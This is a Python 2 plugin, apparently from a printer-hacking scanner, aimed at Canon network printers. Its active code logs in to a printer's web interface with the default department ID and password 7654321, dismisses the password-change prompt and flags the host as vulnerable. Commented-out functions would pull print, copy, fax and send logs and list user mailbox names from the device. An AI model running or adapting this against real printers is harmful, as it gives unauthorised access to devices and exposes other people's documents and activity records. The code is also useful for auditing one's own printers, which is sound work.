# -*- coding:utf-8 -*-
# author : stalker_
# 05-04-17

import beastie
from utils import print_msg
import requests
import re
import time
import os


class Canon(beastie.BasePrinter):
    HEADER = [
        {
            'Accept-Encoding': 'deflate, sdch',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8',
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)'
        },
        {
            'Accept-Encoding': 'gzip, deflate, sdch',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8',
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
            'Upgrade-Insecure-Requests': '1'
        },
        {
            'Accept-Encoding': 'deflate',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8',
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)'
        }
    ]

    def __init__(self, ip, port, den="."):
        beastie.BasePrinter.__init__(self, ip, port, den)
        self.pics_dir = []
        self.box_name = []
        self.base_addr = self.ip + ':' + str(self.port)
        # self.version = 1

    def req_login(self):

        login_mark = 0
        url = "http://" + self.base_addr + '/'
        session = requests.Session()
        try:
            res = session.get(url).content
        except Exception, e:
            print_msg(e)
            raise e

        res_meta = re.findall("<META http-equiv=Refresh content=\"0; URL=http://(.*?)/rps/\">", res)
        if len(res_meta) > 0:
            print_msg("redirect to http://" + res_meta[0] + "/rps/")
            self.base_addr = res_meta[0]
            try:
                res = session.get("http://" + self.base_addr + '/rps', headers=self.HEADER[0]).content
            except Exception, e:
                print_msg(e)
                raise e

        if 'name="login" action="/login" method="post"' in res:
            print_msg("Needs Login.")

            try:
                res = session.post('http://' + self.base_addr + '/login', data={
                    "user_type_generic": "true",
                    "deptid": "7654321",
                    "password": "7654321",
                    "uri": "\%2Frps\%2F"
                }, headers=self.HEADER[2]).content
            except Exception, e:
                print_msg(e)
                raise e

            if 'name="login" action="/login" method="post"' in res:
                raise beastie.LoginError
            if 'document.sdl.conf.value = "no"' in res:
                print_msg("Change password, Cancel.")
                try:
                    res = session.post('http://' + self.base_addr + '/PwdConfirm', {
                        "conf": "no"
                    }, headers=self.HEADER[2])
                except Exception, e:
                    print_msg(e)
                    raise e
            else:
                login_mark = 1
        elif 'name="loginFrm" action="/checkLogin.cgi" autocomplete="off" method="post"' in res:
            try:
                res = session.post('http://' + self.base_addr + '/checkLogin.cgi',
                                   "iToken=&i0012=1&i0014=7654321&i0016=7654321&i0019=").content
                print_msg("Login in with default username&pwd.")
                login_mark = 1
            except Exception, e:
                print_msg(e)
                raise e
        else:
            login_mark = 1

        return login_mark
        # if "this.copyright" in res:
        #     print_msg("version 2.")
        #     self.version = 2
        # else:
        #     print_msg("version 1.")

    # @staticmethod
    # def time_stamp():
    #     return str(int(time.time())) + '000'

    # def download_logs(self):
    #     res = requests.get("http://" + self.base_addr + "/jlp.cgi?Flag=Html_Data&LogType=0&Dummy=" + self.time_stamp())
    #     if res.status_code == 404:
    #         raise beastie.PageNotFoundError
    #
    #     if "/media/ms_err/gif" in res:
    #         uurs = ['jpl.html', 'jcl.html', 'jsl.html', 'jlr.html', 'jfl.html', 'jrl.html']
    #         for uur in uurs:
    #             with open(os.path.join(self.den, uur), 'wb') as fp:
    #                 res = requests.get(
    #                         "http://" + self.base_addr + ".cgi?Dummy=" + self.time_stamp(),
    #                         headers=self.HEADER[0])
    #                 if res.status_code == 404:
    #                     raise beastie.PageNotFoundError
    #                 fp.write(res.content)
    #     else:
    #         for log_type in range(7):
    #             with open(os.path.join(self.den, 'Print&Copy_' + str(log_type) + '.html'), 'wb') as fp:
    #                 res = requests.get("http://" + self.base_addr +
    #                                    "/jlp.cgi?Flag=Html_Data&LogType=" +
    #                                    str(log_type) + "&Dummy=" +
    #                                    self.time_stamp(),
    #                                    headers=self.HEADER[0]
    #                                    )
    #                 if res.status_code == 404:
    #                     raise beastie.PageNotFoundError
    #                 fp.write(res.content)
    #
    # def download_logs_v2(self):
    #     for log_type in range(6):
    #         with open(os.path.join(self.den, 'Print&Copy_' + str(log_type) + '.html'), 'wb') as fp:
    #             res = requests.get("http://" + self.base_addr +
    #                                "/rps/jlp.cgi?Flag=Html_Data&LogType=" +
    #                                str(log_type) + "&Dummy=" +
    #                                self.time_stamp(), headers=self.HEADER[0])
    #             if res.status_code == 404:
    #                 raise beastie.PageNotFoundError
    #             fp.write(res.content)
    #
    #     with open(os.path.join(self.den, 'Send.html'), 'wb') as fp:
    #         res = requests.get("http://" + self.base_addr +
    #                            "/rps/jls.cgi?Flag=Html_Data&CorePGTAG=4&Dummy=" +
    #                            self.time_stamp())
    #         if res.status_code == 404:
    #             raise beastie.PageNotFoundError
    #         fp.write(res.content)
    #
    #     with open(os.path.join(self.den, 'SendFax.html'), 'wb') as fp:
    #         res = requests.get("http://" + self.base_addr +
    #                            "/rps/jlf.cgi?Flag=Html_Data&LogType=TX&Dummy=" +
    #                            self.time_stamp())
    #         if res.status_code == 404:
    #             raise beastie.PageNotFoundError
    #         fp.write(res.content)
    #
    #     with open(os.path.join(self.den, 'ReceiveFax.html'), 'wb') as fp:
    #         res = requests.get("http://" + self.base_addr +
    #                            "/rps/jlf.cgi?Flag=Html_Data&LogType=RX&Dummy=" +
    #                            self.time_stamp())
    #         if res.status_code == 404:
    #             raise beastie.PageNotFoundError
    #         fp.write(res.content)
    #
    #     with open(os.path.join(self.den, 'Receive.html'), 'wb') as fp:
    #         res = requests.get("http://" + self.base_addr +
    #                            "/rps/jlr.cgi?Flag=Html_Data&CorePGTAG=6&Dummy=" +
    #                            self.time_stamp())
    #         if res.status_code == 404:
    #             raise beastie.PageNotFoundError
    #         fp.write(res.content)
    #
    #     with open(os.path.join(self.den, 'Save.html'), 'wb') as fp:
    #         res = requests.get("http://" + self.base_addr +
    #                            "/rps/jlsv.cgi?Flag=Html_Data&CorePGTAG=8&Dummy=" +
    #                            self.time_stamp())
    #         if res.status_code == 404:
    #             raise beastie.PageNotFoundError
    #         fp.write(res.content)
    #
    # def req_box_name_list(self):
    #     res = requests.get("http://" + self.base_addr + "/bpbl.cgi?BoxKind=UserBox&Dummy=" + self.time_stamp())
    #     box_list = re.findall("box_01.*?\n.*?<b>(.*?)</b></a></td><td>.*?</td><td>(.*?)</td></tr>", res.content)
    #     if len(box_list):
    #         for item in box_list:
    #             self.box_name.append(item[0])
    #
    # def req_box_name_list_v2(self):
    #     requests.get("http://" + self.base_addr +
    #                  "/rps/nativetop.cgi?RUIPNxBundle=&CorePGTAG=PGTAG_BOX_USER&Dummy=" + self.time_stamp())
    #     res = requests.get("http://" + self.base_addr +
    #                        "/rps/bpbl.cgi?CorePGTAG=16&BoxKind=UserBox&FromTopPage=1&Dummy=" + self.time_stamp())
    #     box_list = re.findall(
    #             "<a href=\"javascript:box_documents\(\'(.*?)\'\)\">.*?</a></span></td><td></td><td>(.*?)</td></tr>",
    #             res.content)
    #
    #     if len(box_list):
    #         for item in box_list:
    #             count = int(item[1])
    #             if count:
    #                 self.box_name.append(item[0])

    def execute(self):
        try:
            login = self.req_login()
            if login:
                print_msg(self.ip, "seems to be vulnerable.")
            return True
        except Exception, e:
            print_msg(e)
            raise e
        # if self.version == 1:
        #     print_msg("On version 1.")
        #     try:
        #         self.download_logs()
        #         self.req_box_name_list()
        #     except Exception, e:
        #         print_msg(e)
        #
        # elif self.version == 2:
        #     print_msg("On version 2.")
        #     try:
        #         self.download_logs_v2()
        #         self.req_box_name_list_v2()
        #     except Exception, e:
        #         print_msg(e)
        #
        # if len(self.box_name):
        #     print_msg(self.ip, "seems to be vulnerable.")
        # else:
        #     print_msg(self.ip, "has no file to retrieve.")

